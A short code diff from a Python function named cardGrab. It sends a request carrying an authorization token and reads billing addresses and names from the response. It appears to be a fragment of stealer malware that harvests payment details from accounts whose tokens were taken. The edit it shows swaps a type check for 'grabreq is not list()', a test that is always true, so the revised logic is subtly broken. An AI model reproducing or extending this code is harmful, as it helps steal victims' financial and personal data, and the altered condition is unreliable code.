@@ -1347,7 +1347,7 @@ def cardGrab(cc_digits):
                 headers={"Authorization": token},
             )
             grabreq = req.json()
-            if req.status_code in statuses and not isinstance(grabreq, list):
+            if req.status_code in statuses and grabreq is not list():
                 for grab in grabreq:
                     grab1 = grab["billing_address"]
                     name = grab1["name"]
